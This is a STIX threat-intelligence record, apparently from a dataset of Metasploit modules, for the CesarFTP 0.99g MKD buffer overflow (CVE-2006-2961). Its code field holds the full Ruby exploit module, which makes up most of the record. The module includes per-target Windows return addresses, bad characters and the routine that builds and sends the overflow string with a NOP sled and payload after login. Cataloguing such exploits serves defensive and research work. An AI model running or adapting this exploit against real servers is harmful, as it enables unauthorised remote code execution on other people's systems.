{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2658e10f-d7fa-4c87-b579-161b5bfbc3fa",
    "created": "2024-08-14T16:50:46.01985Z",
    "modified": "2024-08-14T16:50:46.019854Z",
    "name": "Cesar FTP 0.99g MKD Command Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.  You must have valid credentials to trigger this vulnerability. Also, you only get one chance, so choose your target carefully. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/cesarftp_mkd.rb",
            "external_id": "cesarftp_mkd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2961"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20060619195555/http://secunia.com:80/advisories/20574/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cesar FTP 0.99g MKD Command Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the MKD verb in CesarFTP 0.99g.\n\n        You must have valid credentials to trigger this vulnerability. Also, you\n        only get one chance, so choose your target carefully.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2961'],\n          [ 'OSVDB', '26364'],\n          [ 'BID', '18586'],\n          [ 'URL', 'http://web.archive.org/web/20060619195555/http://secunia.com:80/advisories/20574/' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 250,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n          'Compat'        =>\n            {\n              'SymbolLookup' => 'ws2ord',\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 } ],\n          [ 'Windows 2000 Pro SP4 French',  { 'Ret' => 0x775F29D0 } ],\n          [ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x774699bf } ], # jmp esp, user32.dll\n          #[ 'Windows XP SP2 English',       { 'Ret' => 0x76b43ae0 } ], # jmp esp, winmm.dll\n          #[ 'Windows XP SP3 English',       { 'Ret' => 0x76b43adc } ], # jmp esp, winmm.dll\n          [ 'Windows 2003 SP1 English',     { 'Ret' => 0x76AA679b } ],\n        ],\n      'DisclosureDate' => '2006-06-12',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /CesarFTP 0\\.99g/)\n      return Exploit::CheckCode::Appears\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect_login\n    return if not c\n\n    sploit =  \"\\n\" * 671 + rand_text_english(3, payload_badchars)\n    sploit << [target.ret].pack('V') + make_nops(40) + payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_cmd( ['MKD', sploit] , false)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-06-12",
    "x_mitre_platforms": [
        "win'"
    ]
}